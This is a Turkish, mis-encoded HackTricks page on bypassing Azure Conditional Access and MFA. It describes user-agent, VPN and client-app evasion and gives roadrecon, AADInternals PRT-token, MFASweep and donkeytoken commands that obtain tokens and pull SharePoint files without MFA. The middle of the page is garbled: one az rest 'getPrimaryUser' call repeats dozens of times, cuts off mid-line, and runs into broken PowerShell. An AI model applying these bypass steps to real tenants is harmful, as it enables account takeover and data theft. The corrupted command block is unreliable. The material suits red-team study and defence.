# Az - KoÅŸullu EriÅŸim PolitikalarÄ± / MFA Atlatma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

Azure KoÅŸullu EriÅŸim politikalarÄ±, belirli **koÅŸullara** dayalÄ± olarak Azure hizmetlerine ve uygulamalarÄ±na eriÅŸim kontrolleri uygulamak iÃ§in Microsoft Azure'da kurulan kurallardÄ±r. Bu politikalar, doÄŸru koÅŸullar altÄ±nda doÄŸru eriÅŸim kontrollerini uygulayarak kuruluÅŸlarÄ±n kaynaklarÄ±nÄ± gÃ¼vence altÄ±na almalarÄ±na yardÄ±mcÄ± olur.\
KoÅŸullu eriÅŸim politikalarÄ± temel olarak **Kimin**, **Neyi**, **Nereden** ve **NasÄ±l** eriÅŸebileceÄŸini tanÄ±mlar.

Ä°ÅŸte birkaÃ§ Ã¶rnek:

1. **Oturum AÃ§ma Riski PolitikasÄ±**: Bu politika, oturum aÃ§ma riski tespit edildiÄŸinde Ã§ok faktÃ¶rlÃ¼ kimlik doÄŸrulama (MFA) gerektirecek ÅŸekilde ayarlanabilir. Ã–rneÄŸin, bir kullanÄ±cÄ±nÄ±n oturum aÃ§ma davranÄ±ÅŸÄ±, normal desenine kÄ±yasla alÄ±ÅŸÄ±lmadÄ±k ÅŸekilde farklÄ± bir Ã¼lkeden oturum aÃ§masÄ± gibi durumlarda sistem ek kimlik doÄŸrulama isteyebilir.
2. **Cihaz Uyumluluk PolitikasÄ±**: Bu politika, yalnÄ±zca kuruluÅŸun gÃ¼venlik standartlarÄ±na uyumlu cihazlardan Azure hizmetlerine eriÅŸimi kÄ±sÄ±tlayabilir. Ã–rneÄŸin, eriÅŸim yalnÄ±zca gÃ¼ncel antivirÃ¼s yazÄ±lÄ±mÄ±na sahip cihazlardan veya belirli bir iÅŸletim sistemi sÃ¼rÃ¼mÃ¼nÃ¼ Ã§alÄ±ÅŸtÄ±ran cihazlardan izin verilebilir.

## KoÅŸullu EriÅŸim PolitikalarÄ± AtlatmalarÄ±

KoÅŸullu eriÅŸim politikasÄ±nÄ±n, **kolayca deÄŸiÅŸtirilebilen bazÄ± bilgileri kontrol ettiÄŸi ve politikanÄ±n atlatÄ±lmasÄ±na izin veren bir geÃ§iÅŸi saÄŸladÄ±ÄŸÄ±** mÃ¼mkÃ¼ndÃ¼r. Ve Ã¶rneÄŸin politika MFA yapÄ±landÄ±rÄ±yorsa, saldÄ±rgan bunu atlayabilir.

### Cihaz PlatformlarÄ± - Cihaz KoÅŸulu

**Cihaz platformuna** (Android, iOS, Windows, macOS) dayalÄ± bir koÅŸul belirtmek mÃ¼mkÃ¼ndÃ¼r, ancak bu, **kullanÄ±cÄ± ajanÄ±na** dayandÄ±ÄŸÄ± iÃ§in oldukÃ§a kolay bir ÅŸekilde atlatÄ±labilir. Hatta **tÃ¼m seÃ§eneklerin MFA'yÄ± zorunlu kÄ±lmasÄ±** durumunda, **tanÄ±madÄ±ÄŸÄ± bir kullanÄ±cÄ± ajanÄ±** kullanÄ±rsanÄ±z MFA'yÄ± atlayabilirsiniz.

### Konumlar: Ãœlkeler, IP aralÄ±klarÄ± - Cihaz KoÅŸulu

Tabii ki, bu, koÅŸullu politikada belirlenmiÅŸse, bir saldÄ±rgan sadece **izin verilen Ã¼lkede bir VPN** kullanabilir veya bu koÅŸullarÄ± atlatmak iÃ§in bir **izin verilen IP adresinden** eriÅŸmeye Ã§alÄ±ÅŸabilir.

### Office365 Ä°stemci UygulamalarÄ±

MÃ¼ÅŸterilerin **Office 365 uygulamalarÄ±na tarayÄ±cÄ±dan eriÅŸmeleri durumunda MFA gerektirebileceÄŸinizi** belirtebilirsiniz:

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Bunu atlatmak iÃ§in, korumayÄ± atlayacak bir masaÃ¼stÃ¼ uygulamasÄ±ndan (aÅŸaÄŸÄ±daki Ã¶rnekte Microsoft Teams'e) bir uygulamaya giriÅŸ yaptÄ±ÄŸÄ±nÄ±zÄ± taklit etmek mÃ¼mkÃ¼ndÃ¼r.
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokrns-stdout

<token>
```
Microsoft Teams uygulamasÄ±nÄ±n birÃ§ok izni olduÄŸu iÃ§in bu eriÅŸimi kullanabileceksiniz.

{% hint style="success" %}
Ã–nceden tanÄ±mlanmÄ±ÅŸ Office365 izinlerine sahip daha fazla genel uygulamanÄ±n I**D'sini** roadtools veritabanÄ±nda bulabilirsiniz:

{% code overflow="wrap" %}
```sql
SELECT appId, displayName FROM ApplicationRefs WHERE publicCLient = 1 ORDER BY displayName ASC
```
{% code %}
az ad signed-in-user show --query objectId -o tsv
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices" --body "{\"displayName\":\"<device_name>\",\"operatingSystem\":\"<operating_system>\",\"enrollmentState\":\"enrolled\",\"deviceType\":\"<device_type>\",\"isCompliant\":true,\"isManaged\":true,\"isRooted\":false,\"isSupervised\":false,\"manufacturer\":\"<manufacturer>\",\"model\":\"<model>\",\"serialNumber\":\"<serial_number>\",\"userId\":\"<user_id>\"}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getComplianceState" --body "{\"deviceCompliancePolicyId\":\"<policy_id>\"}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body "{}"
az rest --method post --uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/<device_id>/getPrimaryUser" --body
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Bu tÃ¼r saldÄ±rÄ±lar hakkÄ±nda daha fazla bilgiyi aÅŸaÄŸÄ±daki sayfada bulabilirsiniz:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## AraÃ§lar

### [roadrecon](https://github.com/dirkjanm/ROADtools)

TÃ¼m politikalarÄ± alÄ±n
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep, saÄŸlanan bir kimlik bilgisi kÃ¼mesini kullanarak Ã§eÅŸitli Microsoft hizmetlerine giriÅŸ yapmaya Ã§alÄ±ÅŸan ve MFA'nÄ±n etkin olup olmadÄ±ÄŸÄ±nÄ± belirlemeye Ã§alÄ±ÅŸan bir PowerShell komut dosyasÄ±dÄ±r. KoÅŸullu eriÅŸim politikalarÄ± ve diÄŸer Ã§ok faktÃ¶rlÃ¼ kimlik doÄŸrulama ayarlarÄ± nasÄ±l yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±na baÄŸlÄ± olarak bazÄ± protokoller tek faktÃ¶rlÃ¼ olarak bÄ±rakÄ±labilir. AyrÄ±ca, ADFS yapÄ±landÄ±rmalarÄ± iÃ§in ek bir kontrolÃ¼ vardÄ±r ve tespit edilirse yerel ADFS sunucusuna giriÅŸ yapmaya Ã§alÄ±ÅŸabilir.
```bash
Invoke-MFASweep -Username <username> -Password <pass>
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token, gÃ¼venlik danÄ±ÅŸmanlarÄ±nÄ±n KoÅŸullu EriÅŸim PolitikalarÄ±nÄ± doÄŸrulamak iÃ§in ihtiyaÃ§ duyduklarÄ±, 2FA etkinleÅŸtirilmiÅŸ Microsoft portalÄ± iÃ§in testler yapmalarÄ±na yardÄ±mcÄ± olmayÄ± amaÃ§layan bir dizi iÅŸlevdir.
```powershell
Import-Module 'C:\Users\Administrador\Desktop\Azure\Modulos ps1\donkeytoken' -Force
```
**Her bir portalÄ±** MFA olmadan **giriÅŸ yapmanÄ±n mÃ¼mkÃ¼n olup olmadÄ±ÄŸÄ±nÄ±** test edin:
```powershell
Test-MFA -credential $cred -Verbose -Debug -InformationAction Continue
```
**Azure** **portal**'Ä±n **kÄ±sÄ±tlanmadÄ±ÄŸÄ±** iÃ§in, Ã¶nceki iÅŸlemden herhangi bir hizmete eriÅŸmek iÃ§in portal uÃ§ noktasÄ±ndan bir token toplamak mÃ¼mkÃ¼ndÃ¼r. Bu durumda Sharepoint tespit edildi ve eriÅŸmek iÃ§in bir token isteniyor:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

VarsayalÄ±m ki belirli bir belgeye eriÅŸim izniniz yok ve MFA nedeniyle web Ã¼zerinden Sharepoint'e eriÅŸemiyorsunuz. Ancak, oluÅŸturulan belirteÃ§ kullanÄ±larak dosyalara eriÅŸmek mÃ¼mkÃ¼ndÃ¼r. Bu belirteÃ§, Sharepoint'ten Sites.Read.All iznine sahiptir.
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Referanslar

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** isterseniz [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
